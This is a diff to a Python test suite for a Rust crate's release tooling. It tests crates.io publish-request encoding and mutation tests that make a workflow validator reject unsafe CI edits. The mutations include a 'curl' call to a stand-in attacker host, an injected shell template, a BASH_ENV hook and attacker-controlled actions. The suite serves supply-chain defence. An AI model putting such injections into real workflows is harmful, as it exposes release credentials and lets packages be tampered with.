@@ -15,6 +15,7 @@ from pathlib import Path
 import re
 import subprocess
 import ssl
+import struct
 import sys
 import tarfile
 import tempfile
@@ -24,6 +25,7 @@ from unittest.mock import patch
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 import verify_llvm_coverage as coverage
 import check_workflows
+import prepare_crates_io_publish
 import publish_release
 import verify_claim_ledger as claim_ledger
 import verify_release_tag
@@ -104,6 +106,184 @@ class PublishTests(unittest.TestCase):
                 self.assertEqual(publish_release.download_registry_archive(version, destination), digest)
             self.assertEqual(destination.read_bytes(), archive)
 
+    def test_publish_request_uses_cargo_registry_length_prefixes(self) -> None:
+        metadata = {
+            "name": "image-slash-star",
+            "vers": "0.1.3",
+            "deps": [],
+            "features": {"default": []},
+        }
+        archive = b"verified-crate-bytes"
+
+        request = prepare_crates_io_publish.encode_publish_request(metadata, archive)
+        metadata_size = struct.unpack_from("<I", request)[0]
+        metadata_start = 4
+        archive_size_offset = metadata_start + metadata_size
+        archive_size = struct.unpack_from("<I", request, archive_size_offset)[0]
+
+        self.assertEqual(
+            json.loads(request[metadata_start:archive_size_offset]), metadata
+        )
+        self.assertEqual(archive_size, len(archive))
+        self.assertEqual(request[archive_size_offset + 4 :], archive)
+
+    def test_prepare_writes_the_exact_candidate_into_the_publish_request(self) -> None:
+        package = {
+            "name": "image-slash-star",
+            "version": "0.1.3",
+            "dependencies": [],
+            "features": {"default": []},
+        }
+        archive = b"immutable candidate archive"
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            candidate = root / "image-slash-star-0.1.3.crate"
+            candidate.write_bytes(archive)
+            output = root / "nested" / "publish.bin"
+
+            prepare_crates_io_publish.prepare(candidate, output, package)
+
+            request = output.read_bytes()
+        metadata_size = struct.unpack_from("<I", request)[0]
+        archive_size_offset = 4 + metadata_size
+        metadata = json.loads(request[4:archive_size_offset])
+        archive_size = struct.unpack_from("<I", request, archive_size_offset)[0]
+        self.assertEqual(metadata["name"], "image-slash-star")
+        self.assertEqual(metadata["vers"], "0.1.3")
+        self.assertEqual(archive_size, len(archive))
+        self.assertEqual(request[archive_size_offset + 4 :], archive)
+
+    def test_registry_metadata_rejects_a_readme_outside_the_package(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            package = {
+                "name": "image-slash-star",
+                "dependencies": [],
+                "readme": "../README.md",
+            }
+
+            with self.assertRaisesRegex(
+                prepare_crates_io_publish.PublishPayloadError,
+                "readme resolves outside the package",
+            ):
+                prepare_crates_io_publish.registry_metadata(
+                    package, package_root=Path(directory)
+                )
+
+    def test_registry_metadata_rejects_unknown_dependency_kinds(self) -> None:
+        package = {
+            "name": "image-slash-star",
+            "dependencies": [{"name": "odd", "kind": "runtime", "req": "*"}],
+        }
+
+        with self.assertRaisesRegex(
+            prepare_crates_io_publish.PublishPayloadError,
+            "unsupported dependency kind",
+        ):
+            prepare_crates_io_publish.registry_metadata(package)
+
+    def test_publish_request_rejects_fields_larger_than_registry_limit(self) -> None:
+        with patch.object(prepare_crates_io_publish, "MAX_U32", 2):
+            with self.assertRaisesRegex(
+                prepare_crates_io_publish.PublishPayloadError,
+                "publish request fields exceed the registry limit",
+            ):
+                prepare_crates_io_publish.encode_publish_request({}, b"123")
+
+    def test_registry_metadata_maps_cargo_dependencies_and_readme(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            (root / "README.md").write_text("Release metadata\n", encoding="utf-8")
+            package = {
+                "name": "image-slash-star",
+                "version": "0.1.3",
+                "dependencies": [
+                    {
+                        "name": "wide",
+                        "req": "^1.6.1",
+                        "kind": None,
+                        "rename": "simd",
+                        "optional": True,
+                        "uses_default_features": False,
+                        "features": ["std"],
+                        "target": "cfg(target_arch = \"x86_64\")",
+                        "registry": None,
+                    }
+                ],
+                "features": {"default": ["simd"]},
+                "authors": ["Appunni M"],
+                "description": "Codec library",
+                "readme": "README.md",
+                "keywords": ["image"],
+                "categories": ["multimedia::images"],
+                "license": "MIT OR Apache-2.0",
+                "repository": "https://example.invalid/repo",
+                "rust_version": "1.96.1",
+            }
+
+            metadata = prepare_crates_io_publish.registry_metadata(
+                package, package_root=root
+            )
+
+        self.assertEqual(metadata["readme"], "Release metadata\n")
+        self.assertEqual(metadata["readme_file"], "README.md")
+        self.assertEqual(
+            metadata["deps"],
+            [
+                {
+                    "name": "wide",
+                    "version_req": "^1.6.1",
+                    "features": ["std"],
+                    "optional": True,
+                    "default_features": False,
+                    "target": "cfg(target_arch = \"x86_64\")",
+                    "kind": "normal",
+                    "registry": None,
+                    "explicit_name_in_toml": "simd",
+                }
+            ],
+        )
+
+    def test_repository_cargo_metadata_forms_a_registry_publish_document(self) -> None:
+        metadata = prepare_crates_io_publish.registry_metadata(
+            prepare_crates_io_publish.cargo_metadata()
+        )
+
+        self.assertEqual(metadata["name"], "image-slash-star")
+        self.assertEqual(metadata["vers"], publish_release.package_version())
+        self.assertEqual(metadata["readme_file"], "README.md")
+        self.assertTrue(metadata["readme"].startswith("# image-slash-star"))
+        self.assertEqual(
+            {dependency["kind"] for dependency in metadata["deps"]}, {"normal"}
+        )
+
+    def test_registry_visibility_wait_retries_without_publishing(self) -> None:
+        with (
+            patch.object(
+                publish_release,
+                "registry_version",
+                side_effect=[None, {"num": "0.1.3"}],
+            ),
+            patch.object(publish_release.time, "sleep") as sleep,
+        ):
+            publish_release.wait_until_visible("0.1.3")
+
+        sleep.assert_called_once_with(5)
+
+    def test_prepare_rejects_a_candidate_for_another_version(self) -> None:
+        package = {"name": "image-slash-star", "version": "0.1.3"}
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            candidate = root / "image-slash-star-0.1.2.crate"
+            candidate.write_bytes(b"archive")
+
+            with self.assertRaisesRegex(
+                prepare_crates_io_publish.PublishPayloadError,
+                "expected verified candidate named",
+            ):
+                prepare_crates_io_publish.prepare(
+                    candidate, root / "publish.bin", package
+                )
+
     def test_download_checksum_mismatch_still_blocks_release(self) -> None:
         metadata = {"num": "0.1.1", "checksum": hashlib.sha256(b"expected archive").hexdigest()}
         with tempfile.TemporaryDirectory() as directory:
@@ -114,34 +294,6 @@ class PublishTests(unittest.TestCase):
             ):
                 with self.assertRaisesRegex(publish_release.PublishError, "differs from crates.io index"):
                     publish_release.download_registry_archive("0.1.1", destination)
-
-    def test_local_or_wrong_tag_context_cannot_publish(self) -> None:
-        context = {
-            "GITHUB_ACTIONS": "true",
-            "GITHUB_REPOSITORY": "appunni-m/image-slash-star",
-            "GITHUB_REF": "refs/tags/v0.1.1",
-            "GITHUB_REF_NAME": "v0.1.1",
-            "GITHUB_SHA": "a" * 40,
-            "ACTIONS_ID_TOKEN_REQUEST_URL": "https://example.invalid/oidc",
-            "CARGO_REGISTRY_TOKEN": "test-placeholder",
-            "RELEASE_CI_SHA": "a" * 40,
-        }
-        with patch.object(publish_release, "capture", side_effect=["", "a" * 40] * 3), \
-             patch.object(publish_release, "package_version", return_value="0.1.1"), \
-             patch.object(publish_release, "verify_remote_tag") as verify_tag:
-            with patch.dict(os.environ, {}, clear=True):
-                with self.assertRaises(publish_release.PublishError):
-                    publish_release.require_publish_approval()
-            with patch.dict(os.environ, context, clear=True):
-                publish_release.require_publish_approval()
-            verify_tag.assert_called_once_with(
-                "v0.1.1", "a" * 40, capture_command=publish_release.capture
-            )
-            context["GITHUB_REF"] = "refs/heads/main"
-            with patch.dict(os.environ, context, clear=True):
-                with self.assertRaises(publish_release.PublishError):
-                    publish_release.require_publish_approval()
-
 
 class ReleaseTagTests(unittest.TestCase):
     def test_remote_annotated_tag_must_peel_to_the_event_commit(self) -> None:
@@ -641,6 +793,489 @@ class WorkflowDownloadTests(unittest.TestCase):
                 check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS,
                 2 * check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS,
             ],
+        )
+
+    def test_release_oidc_boundary_accepts_current_workflow(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml")
+        self.assertEqual(
+            check_workflows.release_oidc_isolation_violations(
+                workflow.read_text(encoding="utf-8")
+            ),
+            [],
+        )
+
+    def test_release_oidc_jobs_reject_unreviewed_step_controls(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        mutations = [
+            (
+                "skip publisher tag verification",
+                "      - name: Verify the remote annotated tag still names this commit\n",
+                "      - name: Verify the remote annotated tag still names this commit\n"
+                "        if: false\n",
+            ),
+            (
+                "ignore publisher tag verification failure",
+                "      - name: Verify the remote annotated tag still names this commit\n",
+                "      - name: Verify the remote annotated tag still names this commit\n"
+                "        continue-on-error: true\n",
+            ),
+            (
+                "skip release attestation",
+                "      - name: Attest the canonical registry archive\n",
+                "      - name: Attest the canonical registry archive\n"
+                "        if: false\n",
+            ),
+            (
+                "ignore release attestation failure",
+                "      - name: Attest the canonical registry archive\n",
+                "      - name: Attest the canonical registry archive\n"
+                "        continue-on-error: true\n",
+            ),
+            (
+                "run tag verification despite earlier failures",
+                "      - name: Attest the canonical registry archive\n",
+                "      - name: Attest the canonical registry archive\n"
+                "        if: always()\n",
+            ),
+            (
+                "quoted publisher condition",
+                "      - name: Verify the remote annotated tag still names this commit\n",
+                "      - name: Verify the remote annotated tag still names this commit\n"
+                "        \"if\": github.event_name == 'workflow_dispatch'\n",
+            ),
+            (
+                "quoted publisher continue-on-error key",
+                "      - name: Verify the remote annotated tag still names this commit\n",
+                "      - name: Verify the remote annotated tag still names this commit\n"
+                "        \"continue-on-error\": true\n",
+            ),
+            (
+                "tagged publisher condition",
+                "      - name: Verify the remote annotated tag still names this commit\n",
+                "      - name: Verify the remote annotated tag still names this commit\n"
+                "        !!str if: github.event_name == 'workflow_dispatch'\n",
+            ),
+            (
+                "tagged attestation failure handling",
+                "      - name: Attest the canonical registry archive\n",
+                "      - name: Attest the canonical registry archive\n"
+                "        !!str continue-on-error: true\n",
+            ),
+            (
+                "folded authentication condition",
+                "      - name: Authenticate to crates.io with OIDC\n"
+                "        id: crates-io-auth\n"
+                "        if: steps.existing-version.outputs.present != 'true'\n",
+                "      - name: Authenticate to crates.io with OIDC\n"
+                "        id: crates-io-auth\n"
+                "        if: steps.existing-version.outputs.present != 'true'\n"
+                "          && always()\n",
+            ),
+            (
+                "folded upload condition",
+                "      - name: Upload the verified archive to crates.io\n"
+                "        if: steps.existing-version.outputs.present != 'true'\n",
+                "      - name: Upload the verified archive to crates.io\n"
+                "        if: steps.existing-version.outputs.present != 'true'\n"
+                "          && always()\n",
+            ),
+            (
+                "duplicate the publisher condition",
+                "        if: steps.existing-version.outputs.present != 'true'\n",
+                "        if: steps.existing-version.outputs.present != 'true'\n"
+                "        if: steps.existing-version.outputs.present != 'true'\n",
+            ),
+        ]
+
+        for case, old, new in mutations:
+            with self.subTest(case=case):
+                unsafe = workflow.replace(old, new, 1)
+                self.assertNotEqual(unsafe, workflow)
+                self.assertIn(
+                    "github-release step controls must match the reviewed policy"
+                    if (
+                        "attestation" in case
+                        or "tag verification despite" in case
+                    )
+                    else "publish step controls must match the reviewed policy",
+                    check_workflows.release_oidc_isolation_violations(unsafe),
+                )
+
+    def test_release_oidc_jobs_reject_job_level_control_overrides(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        mutations = [
+            (
+                "github-release always condition",
+                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
+                "    needs: verify-registry\n    if: always()\n"
+                "    runs-on: ubuntu-24.04\n",
+            ),
+            (
+                "github-release ignored failures",
+                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
+                "    needs: verify-registry\n    continue-on-error: true\n"
+                "    runs-on: ubuntu-24.04\n",
+            ),
+            (
+                "quoted github-release condition",
+                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
+                "    needs: verify-registry\n    \"if\": always()\n"
+                "    runs-on: ubuntu-24.04\n",
+            ),
+            (
+                "tagged github-release condition",
+                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
+                "    needs: verify-registry\n    !!str if: always()\n"
+                "    runs-on: ubuntu-24.04\n",
+            ),
+        ]
+
+        for case, old, new in mutations:
+            with self.subTest(case=case):
+                unsafe = workflow.replace(old, new, 1)
+                self.assertNotEqual(unsafe, workflow)
+                self.assertIn(
+                    "github-release job controls must match the reviewed policy",
+                    check_workflows.release_oidc_isolation_violations(unsafe),
+                )
+
+    def test_release_publisher_rejects_unreviewed_oidc_action(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "uses: rust-lang/crates-io-auth-action@",
+            "uses: attacker/crates-io-auth-action@",
+            1,
+        )
+
+        self.assertIn(
+            "publish may use only the reviewed artifact and crates.io OIDC action revisions",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_publisher_rejects_an_unreviewed_action_revision(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        prefix, publisher = workflow.split("  publish:", 1)
+        unsafe = prefix + "  publish:" + publisher.replace(
+            "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
+            "actions/download-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            1,
+        )
+
+        self.assertIn(
+            "publish may use only the reviewed artifact and crates.io OIDC action revisions",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_workflow_rejects_global_write_all_permissions(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "permissions:\n  contents: read\n",
+            "permissions: write-all\n",
+            1,
+        )
+
+        self.assertIn(
+            "release workflow must use only the reviewed top-level contents: read permission",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_repository_code_jobs_reject_write_all_permissions(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "  prepare-publish:\n    name: Prepare the verified crates.io request\n"
+            "    needs: [preflight, release-coverage]\n"
+            "    runs-on: ubuntu-24.04\n    timeout-minutes: 45\n"
+            "    permissions:\n      contents: read\n",
+            "  prepare-publish:\n    name: Prepare the verified crates.io request\n"
+            "    needs: [preflight, release-coverage]\n"
+            "    runs-on: ubuntu-24.04\n    timeout-minutes: 45\n"
+            "    permissions: write-all\n",
+            1,
+        )
+
+        self.assertIn(
+            "prepare-publish must use its reviewed least-privilege permissions",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_oidc_jobs_reject_runner_and_shell_overrides(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "env:\n  CARGO_TERM_COLOR: always\n",
+            "defaults:\n  run:\n    shell: 'bash -c \"echo injected; bash {0}'\n"
+            "\nenv:\n  CARGO_TERM_COLOR: always\n",
+            1,
+        )
+        unsafe = unsafe.replace(
+            "  publish:\n    name: Publish the verified archive to crates.io\n"
+            "    needs:",
+            "  publish:\n    name: Publish the verified archive to crates.io\n"
+            "    container: attacker.invalid/runner:latest\n    needs:",
+            1,
+        )
+
+        violations = check_workflows.release_oidc_isolation_violations(unsafe)
+        self.assertIn(
+            "release workflow must not override default shell execution", violations
+        )
+        self.assertIn(
+            "publish must not override its runner, shell, or environment", violations
+        )
+
+    def test_workflow_shell_defaults_reject_alternate_yaml_keys(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        shell_default = (
+            "  run:\n"
+            "    shell: 'bash -c \"echo injected; bash {0}'\n"
+        )
+        mutations = [
+            (
+                "explicit defaults key",
+                "? defaults\n:\n" + shell_default + "\nenv:\n",
+            ),
+            (
+                "tagged defaults key",
+                "!!str defaults:\n" + shell_default + "\nenv:\n",
+            ),
+            (
+                "quoted defaults key",
+                "\"defaults\":\n" + shell_default + "\nenv:\n",
+            ),
+        ]
+
+        for case, replacement in mutations:
+            with self.subTest(case=case):
+                unsafe = workflow.replace(
+                    "env:\n  CARGO_TERM_COLOR: always\n",
+                    replacement + "  CARGO_TERM_COLOR: always\n",
+                    1,
+                )
+                self.assertNotEqual(unsafe, workflow)
+                self.assertIn(
+                    "release workflow must not override default shell execution",
+                    check_workflows.release_oidc_isolation_violations(unsafe),
+                )
+
+    def test_release_workflow_environment_rejects_shell_startup_hooks(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            '  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"\n',
+            '  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"\n'
+            "  BASH_ENV: scripts/attacker.sh\n",
+            1,
+        )
+
+        self.assertIn(
+            "release workflow environment must not add execution hooks",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_github_release_requires_verified_registry_bytes(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "    needs: verify-registry\n",
+            "    needs: publish\n",
+            1,
+        )
+
+        self.assertIn(
+            "github-release must follow registry byte verification",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_oidc_steps_reject_custom_shell_templates(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        prefix, publisher = workflow.split("  publish:", 1)
+        before_tag, tag_step = publisher.split(
+            "name: Verify the remote annotated tag still names this commit", 1
+        )
+        tag_step = tag_step.replace(
+            "        shell: bash\n",
+            "        shell: 'bash -c \"echo injected; bash {0}'\n",
+            1,
+        )
+        unsafe = prefix + "  publish:" + before_tag + (
+            "name: Verify the remote annotated tag still names this commit" + tag_step
+        )
+
+        self.assertIn(
+            "publish must use only the reviewed step shells",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_publisher_rejects_extra_command_in_tag_check(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        safe_command = (
+            '          echo "verified annotated tag ${GITHUB_REF_NAME} at ${tag_commit}"\n'
+        )
+        unsafe = workflow.replace(
+            safe_command,
+            safe_command + "          curl https://attacker.invalid/collect\n",
+            1,
+        )
+
+        self.assertIn(
+            "publish shell steps must match the reviewed static command set",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_github_release_rejects_unreviewed_attestation_action(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "uses: actions/attest@",
+            "uses: attacker/attest@",
+            1,
+        )
+
+        self.assertIn(
+            "github-release may use only the reviewed artifact and attestation action revisions",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_package_preparation_cannot_receive_oidc_permission(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "  prepare-publish:\n    name:",
+            "  prepare-publish:\n    permissions:\n      id-token: write\n    name:",
+            1,
+        )
+
+        self.assertIn(
+            "prepare-publish must not have OIDC token permission",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_publisher_cannot_checkout_or_run_cargo(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "      - name: Verify publish request checksum\n",
+            "      - uses: actions/checkout@1234567890abcdef1234567890abcdef12345678\n"
+            "      - name: Build after OIDC permission is granted\n"
+            "        run: cargo package --locked\n"
+            "      - name: Verify publish request checksum\n",
+            1,
+        )
+
+        violations = check_workflows.release_oidc_isolation_violations(unsafe)
+        self.assertIn(
+            "publish must not check out or execute repository source", violations
+        )
+        self.assertIn(
+            "publish must not run Cargo or repository-controlled scripts", violations
+        )
+
+    def test_release_publisher_requires_tag_check_before_oidc(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "name: Verify the remote annotated tag still names this commit",
+            "name: Omit remote annotated tag verification",
+            1,
+        )
+
+        self.assertIn(
+            "publish must recheck the remote annotated tag",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_crates_io_token_is_rejected_at_job_scope(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "    needs: [preflight, release-coverage, prepare-publish]\n",
+            "    needs: [preflight, release-coverage, prepare-publish]\n"
+            "    env:\n"
+            "      CRATES_IO_PUBLISH_TOKEN: ${{ steps.crates-io-auth.outputs.token }}\n",
+            1,
+        )
+
+        self.assertIn(
+            "crates.io credentials must not be job-scoped",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_verification_script_cannot_run_after_attestation(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "          gh release create \"$GITHUB_REF_NAME\" \\\n",
+            "          python3 scripts/verify_release_tag.py\n"
+            "          gh release create \"$GITHUB_REF_NAME\" \\\n",
+            1,
+        )
+
+        self.assertIn(
+            "github-release must not execute repository code with OIDC permission",
+            check_workflows.release_oidc_isolation_violations(unsafe),
+        )
+
+    def test_release_job_cannot_run_repository_code_before_attestation(self) -> None:
+        workflow = (Path(__file__).resolve().parent.parent
+                    / ".github" / "workflows" / "release.yml").read_text(
+                        encoding="utf-8"
+                    )
+        unsafe = workflow.replace(
+            "      - name: Verify canonical registry checksum\n",
+            "      - name: Verify canonical registry checksum\n"
+            "        run: python3 scripts/verify_release_tag.py\n",
+            1,
+        )
+
+        self.assertIn(
+            "github-release must not execute repository code with OIDC permission",
+            check_workflows.release_oidc_isolation_violations(unsafe),
         )
 
     def test_download_retries_transient_http_error_then_succeeds(self) -> None:
